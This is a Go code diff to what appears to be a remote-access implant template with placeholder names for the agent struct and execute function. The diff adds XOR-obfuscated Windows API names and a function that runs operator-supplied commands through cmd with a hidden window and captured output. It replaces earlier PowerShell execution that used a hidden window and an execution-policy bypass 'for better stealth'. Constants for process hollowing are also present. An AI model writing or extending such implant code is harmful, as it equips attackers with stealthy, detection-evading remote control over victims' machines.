@@ -51,6 +51,17 @@ const (
 	TH32CS_SNAPPROCESS = 0x00000002
 	MAX_PATH = 260
 
+	// For process creation
+	CREATE_NEW_CONSOLE = 0x00000010
+	CREATE_NO_WINDOW = 0x08000000
+	STARTF_USESHOWWINDOW = 0x00000001
+	STARTF_USESTDHANDLES = 0x00000100
+	SW_HIDE = 0
+
+	// For pipe creation
+	FILE_ATTRIBUTE_NORMAL = 0x00000080
+	INVALID_HANDLE_VALUE = 0xFFFFFFFF
+
 	// For process hollowing
 	IMAGE_DOS_SIGNATURE = 0x5A4D
 	IMAGE_NT_SIGNATURE = 0x00004550
@@ -84,6 +95,9 @@ var (
 	obfuscatedGetConsoleWindow = []byte{0x05, 0x27, 0x36, 0x01, 0x2d, 0x2c, 0x31, 0x2d, 0x2e, 0x27, 0x15, 0x2b, 0x2c, 0x26, 0x2d, 0x35} // "GetConsoleWindow"
 	obfuscatedShowWindow = []byte{0x11, 0x2a, 0x2d, 0x35, 0x15, 0x2b, 0x2c, 0x26, 0x2d, 0x35} // "ShowWindow"
 	obfuscatedFreeConsole = []byte{0x04, 0x30, 0x27, 0x27, 0x01, 0x2d, 0x2c, 0x31, 0x2d, 0x2e, 0x27} // "FreeConsole"
+	obfuscatedGetExitCodeProcess = []byte{0x05, 0x27, 0x36, 0x07, 0x3a, 0x2b, 0x36, 0x01, 0x2d, 0x26, 0x27, 0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31} // "GetExitCodeProcess"
+	obfuscatedCreatePipe = []byte{0x01, 0x30, 0x27, 0x23, 0x36, 0x27, 0x12, 0x2b, 0x32, 0x27} // "CreatePipe"
+	obfuscatedReadFile = []byte{0x10, 0x27, 0x23, 0x26, 0x04, 0x2b, 0x2e, 0x27} // "ReadFile"
 
 	// XOR key for deobfuscation
 	obfuscationKey = byte(0x42)
@@ -110,6 +124,9 @@ var (
 	procFreeConsole = kernel32.NewProc(deobfuscateString(obfuscatedFreeConsole, obfuscationKey))
 	procShowWindow = user32.NewProc(deobfuscateString(obfuscatedShowWindow, obfuscationKey))
 	procGetConsoleWindow = kernel32.NewProc(deobfuscateString(obfuscatedGetConsoleWindow, obfuscationKey))
+	procGetExitCodeProcess = kernel32.NewProc(deobfuscateString(obfuscatedGetExitCodeProcess, obfuscationKey))
+	procCreatePipe = kernel32.NewProc(deobfuscateString(obfuscatedCreatePipe, obfuscationKey))
+	procReadFile = kernel32.NewProc(deobfuscateString(obfuscatedReadFile, obfuscationKey))
 )
 
 // PROCESSENTRY32 structure for process enumeration
@@ -256,6 +273,12 @@ type IMAGE_SECTION_HEADER struct {
 	Characteristics uint32
 }
 
+type SECURITY_ATTRIBUTES struct {
+	NLength              uint32
+	LPSecurityDescriptor uintptr
+	bInheritHandle       uint32
+}
+
 type PROCESS_INFORMATION struct {
 	Process   uintptr
 	Thread    uintptr
@@ -341,6 +364,161 @@ func createProcess(applicationName *uint16, commandLine *uint16, processAttribut
 		return callErr
 	}
 	return nil
+}
+
+// executeCommandHidden executes a Windows command with the window hidden and captures output using pipes
+func executeCommandHidden(command string) (string, error) {
+	if runtime.GOOS != "windows" {
+		return "", fmt.Errorf("executeCommandHidden only supported on Windows")
+	}
+
+	// Create anonymous pipes for capturing output
+	var saAttr SECURITY_ATTRIBUTES
+	saAttr.NLength = uint32(unsafe.Sizeof(saAttr))
+	saAttr.bInheritHandle = 1 // Set inherit handle to true
+	saAttr.LPSecurityDescriptor = 0
+
+	// Create stdout pipe
+	var stdoutRead, stdoutWrite uintptr
+	ret, _, _ := procCreatePipe.Call(
+		uintptr(unsafe.Pointer(&stdoutRead)),
+		uintptr(unsafe.Pointer(&stdoutWrite)),
+		uintptr(unsafe.Pointer(&saAttr)),
+	)
+	if ret == 0 {
+		return "", fmt.Errorf("failed to create stdout pipe")
+	}
+
+	// Create stderr pipe
+	var stderrRead, stderrWrite uintptr
+	ret, _, _ = procCreatePipe.Call(
+		uintptr(unsafe.Pointer(&stderrRead)),
+		uintptr(unsafe.Pointer(&stderrWrite)),
+		uintptr(unsafe.Pointer(&saAttr)),
+	)
+	if ret == 0 {
+		syscall.CloseHandle(syscall.Handle(stdoutRead))
+		syscall.CloseHandle(syscall.Handle(stdoutWrite))
+		return "", fmt.Errorf("failed to create stderr pipe")
+	}
+
+	// Prepare the command line
+	var cmdLine *uint16
+	shell := fmt.Sprintf("cmd /C %s", command)
+	cmdLine, err := syscall.UTF16PtrFromString(shell)
+	if err != nil {
+		syscall.CloseHandle(syscall.Handle(stdoutRead))
+		syscall.CloseHandle(syscall.Handle(stdoutWrite))
+		syscall.CloseHandle(syscall.Handle(stderrRead))
+		syscall.CloseHandle(syscall.Handle(stderrWrite))
+		return "", err
+	}
+
+	// Initialize STARTUPINFO structure with pipe handles
+	var si STARTUPINFO
+	si.Cb = uint32(unsafe.Sizeof(si))
+	si.Flags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES
+	si.ShowWindow = SW_HIDE // Hide the window
+	si.StdInput = 0        // Use default input
+	si.StdOutput = stdoutWrite // Redirect stdout to our pipe (child writes to this)
+	si.StdError = stderrWrite  // Redirect stderr to our pipe (child writes to this)
+
+	// Initialize PROCESS_INFORMATION structure
+	var pi PROCESS_INFORMATION
+
+	// Create the process with hidden window and redirected output
+	err = createProcess(
+		nil, // applicationName
+		cmdLine, // commandLine
+		nil, // processAttributes
+		nil, // threadAttributes
+		true, // inheritHandles - important for pipe inheritance
+		CREATE_NO_WINDOW, // creationFlags - this is key for hiding the window
+		0, // environment
+		nil, // currentDirectory
+		&si, // startupInfo
+		&pi, // processInformation
+	)
+
+	if err != nil {
+		syscall.CloseHandle(syscall.Handle(stdoutRead))
+		syscall.CloseHandle(syscall.Handle(stdoutWrite))
+		syscall.CloseHandle(syscall.Handle(stderrRead))
+		syscall.CloseHandle(syscall.Handle(stderrWrite))
+		return "", err
+	}
+
+	// Close the write handles in parent after process creation since child now has them
+	syscall.CloseHandle(syscall.Handle(stdoutWrite))
+	syscall.CloseHandle(syscall.Handle(stderrWrite))
+
+	// Close process and thread handles when done
+	defer syscall.CloseHandle(syscall.Handle(pi.Process))
+	defer syscall.CloseHandle(syscall.Handle(pi.Thread))
+
+	// Wait for the process to complete
+	_, err = syscall.WaitForSingleObject(syscall.Handle(pi.Process), syscall.INFINITE)
+	if err != nil {
+		// Continue even if there was an error, we still want to read output
+	}
+
+	// Read from stdout pipe - the child process wrote to stdoutWrite, so we read from stdoutRead
+	var stdoutBytes []byte
+	var buffer [4096]byte
+	var bytesRead uint32
+	for {
+		ret, _, _ := procReadFile.Call(
+			stdoutRead,
+			uintptr(unsafe.Pointer(&buffer[0])),
+			uintptr(len(buffer)),
+			uintptr(unsafe.Pointer(&bytesRead)),
+			0,
+		)
+		if ret == 0 || bytesRead == 0 { // No more data or error
+			break
+		}
+		stdoutBytes = append(stdoutBytes, buffer[:bytesRead]...)
+	}
+
+	// Read from stderr pipe - the child process wrote to stderrWrite, so we read from stderrRead
+	var stderrBytes []byte
+	for {
+		ret, _, _ := procReadFile.Call(
+			stderrRead,
+			uintptr(unsafe.Pointer(&buffer[0])),
+			uintptr(len(buffer)),
+			uintptr(unsafe.Pointer(&bytesRead)),
+			0,
+		)
+		if ret == 0 || bytesRead == 0 { // No more data or error
+			break
+		}
+		stderrBytes = append(stderrBytes, buffer[:bytesRead]...)
+	}
+
+	// Close the read handles
+	syscall.CloseHandle(syscall.Handle(stdoutRead))
+	syscall.CloseHandle(syscall.Handle(stderrRead))
+
+	output := string(stdoutBytes) + string(stderrBytes)
+
+	// Get the exit code of the process
+	var exitCode uint32
+	procGetExitCodeProcess.Call(
+		uintptr(pi.Process),
+		uintptr(unsafe.Pointer(&exitCode)),
+	)
+
+	// If no output and process exited with error, return error info
+	if len(output) == 0 && exitCode != 0 {
+		return fmt.Sprintf("[ERROR] Command execution failed with exit code: %d", exitCode), nil
+	}
+
+	if output == "" {
+		return "[Command executed successfully - no output]", nil
+	}
+
+	return output, nil
 }
 
 func resumeThread(threadHandle uintptr) (uint32, error) {
@@ -850,35 +1028,19 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_EXECUTE_FUNC}(command string) string {
 		strings.Contains(commandLower, "powershell -")
 
 
-	if isPowerShell {
-		var cmd *exec.Cmd
-
-		if runtime.GOOS == "windows" {
-			cmd = exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", command)
-		} else {
-			cmd = exec.Command("pwsh", "-Command", command)
-		}
-
-		var stdout, stderr bytes.Buffer
-		cmd.Stdout = &stdout
-		cmd.Stderr = &stderr
-
-		err := cmd.Run()
+	if runtime.GOOS == "windows" {
+		// Use the hidden command execution function for Windows to prevent any console window flickering
+		result, err := executeCommandHidden(command)
 		if err != nil {
-			return fmt.Sprintf("[ERROR] PowerShell command execution failed: %v", err)
+			return fmt.Sprintf("[ERROR] Command execution failed: %v", err)
 		}
-
-		output := stdout.String() + stderr.String()
-		if output == "" {
-			return "[PowerShell command executed successfully - no output]"
-		}
-		return output
+		return result
 	} else {
+		// For non-Windows systems, use the standard execution
 		var cmd *exec.Cmd
 
-		if runtime.GOOS == "windows" {
-			// Execute cmd commands through PowerShell with hidden window for better stealth
-			cmd = exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", command)
+		if isPowerShell {
+			cmd = exec.Command("pwsh", "-Command", command)
 		} else {
 			cmd = exec.Command("sh", "-c", command)
 		}
